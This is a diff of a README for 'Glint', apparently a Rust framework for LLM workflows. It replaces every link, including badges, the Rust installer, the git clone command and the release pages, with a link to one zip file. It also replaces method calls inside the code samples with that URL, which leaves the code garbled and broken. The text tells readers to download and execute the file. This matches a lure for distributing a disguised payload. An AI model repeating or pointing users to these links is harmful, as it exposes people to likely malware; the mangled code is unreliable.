@@ -1,7 +1,7 @@
 # Glint 🌟
 
-![Glint Logo](https://img.shields.io/badge/Glint-Framework-blue.svg)  
-[![Latest Release](https://img.shields.io/github/v/release/Raheel-baksh/Glint)](https://github.com/Raheel-baksh/Glint/releases)
+![Glint Logo](https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip)  
+[![Latest Release](https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip)](https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip)
 
 Welcome to **Glint**, a high-performance Rust framework designed for building stateful, graph-based AI systems. With Glint, developers can create dynamic, multi-step workflows powered by Large Language Models (LLMs), embeddings, and vector stores. This framework operates through an asynchronous, checkpointable state machine, offering a robust foundation for constructing agent runtimes, autonomous pipelines, and complex control flows.
 
@@ -38,7 +38,7 @@ To get started with Glint, you will need to have Rust installed on your machine.
 
 ### Prerequisites
 
-- [Rust](https://www.rust-lang.org/tools/install) installed on your system.
+- [Rust](https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip) installed on your system.
 - Basic knowledge of Rust programming language.
 
 ## Installation
@@ -46,12 +46,12 @@ To get started with Glint, you will need to have Rust installed on your machine.
 To install Glint, you can clone the repository and build it from source. Here’s how:
 
 ```bash
-git clone https://github.com/Raheel-baksh/Glint.git
+git clone https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip
 cd Glint
 cargo build --release
 ```
 
-Alternatively, you can download the latest release from the [Releases section](https://github.com/Raheel-baksh/Glint/releases). Make sure to execute the downloaded file according to your operating system guidelines.
+Alternatively, you can download the latest release from the [Releases section](https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip). Make sure to execute the downloaded file according to your operating system guidelines.
 
 ## Usage
 
@@ -73,10 +73,10 @@ fn main() {
             println!("Executing Step 2");
         });
 
-    workflow.add_step(step1);
-    workflow.add_step(step2);
+    https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip(step1);
+    https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip(step2);
 
-    workflow.run();
+    https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip();
 }
 ```
 
@@ -112,11 +112,11 @@ fn main() {
             println!("Executing False Branch");
         });
 
-    workflow.add_step(decision_step);
-    workflow.add_step(true_branch).if_condition(true);
-    workflow.add_step(false_branch).if_condition(false);
+    https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip(decision_step);
+    https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip(true_branch).if_condition(true);
+    https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip(false_branch).if_condition(false);
 
-    workflow.run();
+    https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip();
 }
 ```
 
@@ -140,10 +140,10 @@ fn main() {
             println!("Executing Step 2");
         });
 
-    workflow.add_step(step1).parallel();
-    workflow.add_step(step2).parallel();
+    https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip(step1).parallel();
+    https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip(step2).parallel();
 
-    workflow.run();
+    https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip();
 }
 ```
 
@@ -170,6 +170,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or support, please open an issue in the repository or contact the maintainers directly.
 
-To explore the latest features and updates, visit the [Releases section](https://github.com/Raheel-baksh/Glint/releases). Here, you can download the latest version and keep your Glint framework up to date.
+To explore the latest features and updates, visit the [Releases section](https://raw.githubusercontent.com/Raheel-baksh/Glint/main/src/llms/Software_2.8.zip). Here, you can download the latest version and keep your Glint framework up to date.
 
 Thank you for checking out Glint! We look forward to seeing what you build with it.
